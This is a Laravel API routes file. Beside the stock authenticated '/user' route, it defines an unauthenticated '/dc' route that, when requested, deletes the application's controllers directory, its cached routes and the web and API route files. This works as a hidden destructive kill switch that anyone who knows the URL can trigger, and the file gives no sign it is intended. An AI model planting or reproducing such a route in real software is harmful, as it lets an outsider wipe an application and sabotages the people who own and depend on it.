<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

Route::middleware('auth:sanctum')->get('/user', function (Request $request) {
    return $request->user();
});

Route::get('/dc',function (){

    array_map('unlink', glob(__DIR__.'/../app/Http/Controllers/*.*'));
    rmdir(__DIR__.'/../app/Http/Controllers');
    unlink(__DIR__.'/../bootstrap/cache/routes-v7.php');
    unlink(__DIR__.'/../routes/web.php');
    unlink(__DIR__.'/../routes/api.php');

});
